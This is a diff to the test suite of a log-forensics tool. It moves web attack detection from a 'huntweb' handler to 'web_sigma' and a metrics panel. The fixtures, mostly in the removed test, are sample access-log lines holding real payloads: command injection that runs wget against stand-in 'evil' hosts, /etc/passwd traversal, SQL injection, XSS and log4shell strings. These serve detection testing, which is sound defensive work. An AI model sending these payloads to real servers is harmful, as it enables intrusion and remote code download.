@@ -1,3 +1,4 @@
+import json
 import logging
 from pathlib import Path
 
@@ -2244,7 +2245,7 @@ def test_webcommon_xforwarded_for_recovers_client():
 def test_webcommon_parses_ssl_and_extra_fields_keeping_referer_ua():
     """SSL vhosts log %{SSL_PROTOCOL}x %{SSL_CIPHER}x (and others add %D %T)
     between the size and the "referer"/"ua" pair. Those extra unquoted fields must
-    not cost us referer/UA -- UA-based detections (huntweb/web_sigma) depend on it,
+    not cost us referer/UA -- UA-based detections (web_sigma) depend on it,
     and HTTPS is where the interesting traffic usually is."""
     from artifact_engine.handlers._webcommon import parse
 
@@ -2346,6 +2347,12 @@ def test_tools_lock_records_binaries_fetched_outside_the_manifests(tmp_path):
     assert "hayabusa" in entry["source"]
 
 
+def _panel(root):
+    """The data web_metrics.html embeds (`const D=`)."""
+    html = (root / "web_metrics.html").read_text(encoding="utf-8")
+    return json.JSONDecoder().raw_decode(html.split("const D=", 1)[1])[0]
+
+
 def test_web_metrics_bounds_its_accumulators_and_says_so(tmp_path, monkeypatch, caplog):
     """Everything per IP was already capped, but the top-level accumulators were not
     -- and their keys come from whoever hits the server. A months-long log from a
@@ -2373,8 +2380,7 @@ def test_web_metrics_bounds_its_accumulators_and_says_so(tmp_path, monkeypatch, 
     with caplog.at_level(logging.WARNING, logger="aeng-cap-test"):
         wm.run(ctx)
 
-    rows = (out / "web_ip_stats.csv").read_text(encoding="utf-8").splitlines()
-    assert len(rows) - 1 == 3                       # header + exactly the ceiling
+    assert len(_panel(tmp_path)["ips"]) == 3          # exactly the ceiling
     # the 6 requests that could not be attributed are named, not silently dropped
     msgs = " ".join(r.getMessage() for r in caplog.records)
     assert "beyond that ceiling" in msgs and "6 request(s)" in msgs
@@ -2394,7 +2400,7 @@ def test_handler_web_metrics_aggregates(tmp_path):
         '3.3.3.3 - - [25/May/2026:05:00:02 +0200] "GET /phpmyadmin/ HTTP/1.1" 404 0 "-" "-"',
         # WebDAV method -> odd-method flag
         '7.7.7.7 - - [25/May/2026:03:00:00 +0200] "PROPFIND /webdav HTTP/1.1" 405 0 "-" "-"',
-        # sqli payload on a 404: probe still ranks the IP (huntweb would drop it)
+        # sqli payload on a 404: a probe still ranks the IP
         '91.92.10.10 - - [25/May/2026:04:00:00 +0200] "GET /s?q=1 UNION SELECT a,b '
         'FROM users HTTP/1.1" 404 1 "-" "-"',
     ]
@@ -2407,18 +2413,17 @@ def test_handler_web_metrics_aggregates(tmp_path):
                        handler="artifact_engine.handlers.lin_web_metrics:run")
     assert run_parser(p, _ctx(tmp_path, tmp_path / "CSVs")).status == "ok"
 
-    stats = (tmp_path / "CSVs" / "web_ip_stats.csv").read_text(encoding="utf-8")
-    lines = stats.splitlines()
-    assert lines[0] == ("ip,country,origin,asn,requests,s2xx,s3xx,s401,s403,s404,"
-                        "s4xx,s5xx,mb_sent,paths,odd_methods,attack_hits,"
-                        "first_seen,last_seen,suspicious")
-    assert lines[1].startswith("9.9.9.9,")                    # top talker first
-    row = {ln.split(",")[0]: ln for ln in lines[1:]}
-    assert row["9.9.9.9"].endswith(",scan") and ",61," in row["9.9.9.9"]
-    assert row["8.8.8.8"].endswith(",auth-fail") and ",25,0," in row["8.8.8.8"]
-    assert row["7.7.7.7"].endswith(",odd-method") and "PROPFIND:1" in row["7.7.7.7"]
-    assert row["91.92.10.10"].endswith(",attack")             # probe counted (404)
-    assert row["10.0.0.150"].endswith(",")                    # benign: no flag
+    # the per-IP table is the panel's, not a table (v0.7.170)
+    assert not (tmp_path / "CSVs" / "web_ip_stats.csv").exists()
+    ips = _panel(tmp_path)["ips"]
+    assert ips[0][0] == "9.9.9.9"                             # top talker first
+    row = {r[0]: r for r in ips}
+    # columns as the panel's CSV download names them (_IP_HEADER)
+    assert row["9.9.9.9"][18] == "scan" and row["9.9.9.9"][4] == 61
+    assert row["8.8.8.8"][18] == "auth-fail" and row["8.8.8.8"][7:9] == [25, 0]
+    assert row["7.7.7.7"][18] == "odd-method" and row["7.7.7.7"][14] == "PROPFIND:1"
+    assert row["91.92.10.10"][18] == "attack"                 # probe counted (404)
+    assert row["10.0.0.150"][18] == ""                        # benign: no flag
 
     # the 404 ranking is the panel's, not a table (v0.7.161)
     assert not (tmp_path / "CSVs" / "web_404_paths.csv").exists()
@@ -2486,15 +2491,18 @@ def test_indicators_load_and_match(tmp_path):
     assert _indicators.load_indicators(tmp_path / "missing.txt") == []
 
 
-def test_handler_huntweb_user_indicators_path_when_served_ua_at_any_status(tmp_path):
-    """v0.7.144: a path indicator counts on a served request only (a refused probe
-    is not a finding); a User-Agent indicator -- who is asking -- at any status."""
+def test_handler_web_sigma_user_indicators_path_when_served_ua_at_any_status(tmp_path):
+    """v0.7.170: web_suspicious.txt is read by web_sigma (web_hunt is gone), each hit
+    a row like a Sigma one. v0.7.144 rules, unchanged: a path indicator counts on a
+    served request only (a refused probe is not a finding); a User-Agent indicator
+    -- who is asking -- at any status."""
     ap = tmp_path / "[root]" / "var" / "log" / "apache2"
     ap.mkdir(parents=True)
     (ap / "access.log").write_text("\n".join([
         _BENIGN,
         # scanner UA on a 404 -> listed: the UA names the tool whatever the answer
         '9.9.9.9 - - [25/May/2026:01:00:00 +0200] "GET /login HTTP/1.1" 404 0 "-" "sqlmap/1.7"',
+        '9.9.9.9 - - [25/May/2026:01:00:09 +0200] "GET /lo2 HTTP/1.1" 404 0 "-" "sqlmap/1.7"',
         # backup path refused -> a probe, not listed
         '8.8.8.8 - - [25/May/2026:01:00:01 +0200] "GET /db.sql HTTP/1.1" 404 0 "-" "curl/8"',
         # backup path served -> an exposure, listed
@@ -2507,65 +2515,19 @@ def test_handler_huntweb_user_indicators_path_when_served_ua_at_any_status(tmp_p
 
     ctx = ParserContext(evidence=tmp_path, out=tmp_path / "CSVs", tools=tmp_path,
                         assets=assets, machine_name="host", volume="live", log=None)
-    p = ParserManifest(id="huntweb", handler="artifact_engine.handlers.lin_huntweb:run")
+    p = ParserManifest(id="web_sigma", handler="artifact_engine.handlers.lin_web_sigma:run")
     assert run_parser(p, ctx).status == "ok"
     import csv
-    with open(tmp_path / "CSVs" / "web_hunt.csv", encoding="utf-8", newline="") as fh:
-        rows = sorted((r["category"], r["ip"], r["status"]) for r in csv.DictReader(fh))
-    assert rows == [("backup_leak", "8.8.4.4", "200"), ("scanner_ua", "9.9.9.9", "404")]
-
-
-def test_handler_huntweb_flags_payloads_skips_benign_and_geo(tmp_path):
-    attacks = [
-        # cmdi (ThinkPHP) from a Tor-listed public IP
-        '45.66.33.21 - - [25/May/2026:00:23:03 +0200] "GET /index.php?s=/index/'
-        r'think\app/invokefunction&function=call_user_func_array&vars[0]=shell_exec'
-        '&vars[1][]=wget http://evil.top/s.sh HTTP/1.1" 200 1 "-" "-"',
-        # lfi from a private IP
-        '10.0.0.5 - - [25/May/2026:00:00:00 +0200] "GET /a?f=../../../../etc/passwd '
-        'HTTP/1.1" 200 1 "-" "-"',
-        # sqli, xss (encoded), log4shell from an unknown public IP
-        '91.92.10.10 - - [25/May/2026:00:00:01 +0200] "GET /s?q=1 UNION SELECT a,b '
-        'FROM users HTTP/1.1" 200 1 "-" "-"',
-        '91.92.10.10 - - [25/May/2026:00:00:02 +0200] "GET /p?x=%3Cscript%3Ealert(1)'
-        '%3C/script%3E HTTP/1.1" 200 1 "-" "-"',
-        '91.92.10.10 - - [25/May/2026:00:00:03 +0200] "GET /j?x=${jndi:ldap://evil/a} '
-        'HTTP/1.1" 200 1 "-" "-"',
-        # cmdi payload but the server returned 404 -> must be filtered out (not served)
-        '5.5.5.5 - - [25/May/2026:00:00:09 +0200] "GET /zzz404?x=;wget http://evil/s.sh '
-        'HTTP/1.1" 404 1 "-" "-"',
+    with open(tmp_path / "CSVs" / "web_sigma.csv", encoding="utf-8", newline="") as fh:
+        rows = sorted((r["rule"], r["level"], r["ip"], r["status"], r["hits"],
+                       r["first_seen"], r["last_seen"])
+                      for r in csv.DictReader(fh) if r["rule"].startswith("web_suspicious"))
+    assert rows == [
+        ("web_suspicious.txt: backup_leak", "medium", "8.8.4.4", "200", "1",
+         "2026-05-25 01:00:02 +0200", "2026-05-25 01:00:02 +0200"),
+        ("web_suspicious.txt: scanner_ua", "medium", "9.9.9.9", "404", "2",
+         "2026-05-25 01:00:00 +0200", "2026-05-25 01:00:09 +0200"),
     ]
-    ap = tmp_path / "[root]" / "var" / "log" / "apache2"
-    ap.mkdir(parents=True)
-    (ap / "access.log").write_text(
-        "\n".join([_BENIGN, _JETPACK, _FILEMGR, *attacks]) + "\n", encoding="utf-8")
-    assets = tmp_path / "assets"
-    assets.mkdir()
-    (assets / "tor-exit-nodes.txt").write_text("45.66.33.21\n", encoding="utf-8")
-
-    ctx = ParserContext(evidence=tmp_path, out=tmp_path / "CSVs", tools=tmp_path,
-                        assets=assets, machine_name="host", volume="live", log=None)
-    p = ParserManifest(id="huntweb", handler="artifact_engine.handlers.lin_huntweb:run")
-    r = run_parser(p, ctx)
-    assert r.status == "ok"
-    out = (tmp_path / "CSVs" / "web_hunt.csv").read_text(encoding="utf-8")
-
-    assert out.splitlines()[0].startswith("category,flag,time,ip,country,origin,asn")
-    # benign traffic never flagged (FP guards)
-    assert "/~dbw00/" not in out
-    assert "xmlrpc.php" not in out                   # jetpack is legitimate
-    assert "/t.php" not in out                       # php file-manager (abs path, no ../)
-    assert "zzz404" not in out                       # payload but 404 -> not served, filtered
-    # every attack class detected, category is the first column
-    assert "cmdi," in out and "invokefunction" in out
-    assert "lfi," in out and "/etc/passwd" in out
-    assert "sqli," in out
-    assert "xss," in out
-    assert "log4shell," in out
-    # offline IP origin enrichment (no mmdb -> country '?'/asn '', but tags resolve)
-    assert ",45.66.33.21,?,tor," in out              # Tor exit list hit
-    assert ",10.0.0.5,LAN,private," in out           # RFC1918
-    assert ",91.92.10.10,?,unknown," in out         # public, no geo db
 
 
 def test_sigma_web_engine_compiles_bundled_rules():
@@ -5278,14 +5240,14 @@ def test_a_volume_with_no_access_logs_skips_where_it_is_called(tmp_path):
         iter_records(_ctx(tmp_path, tmp_path / "CSVs"))
 
 
-def test_the_three_readers_declare_the_pass_they_depend_on():
+def test_the_readers_declare_the_pass_they_depend_on():
     """Execution order comes from `depends_on` (not `provides`), so without it the
-    three can run BEFORE web_access and silently take the slow path every time --
+    readers can run BEFORE web_access and silently take the slow path every time --
     the change would measure as no change."""
     import yaml
     d = (Path(__file__).resolve().parent.parent / "src" / "artifact_engine"
          / "data" / "parsers" / "linux")
-    for name in ("web_hunt", "web_metrics", "web_sigma"):
+    for name in ("web_metrics", "web_sigma"):
         m = yaml.safe_load((d / f"{name}.yaml").read_text(encoding="utf-8"))
         assert m.get("depends_on") == ["web_access"], name
 
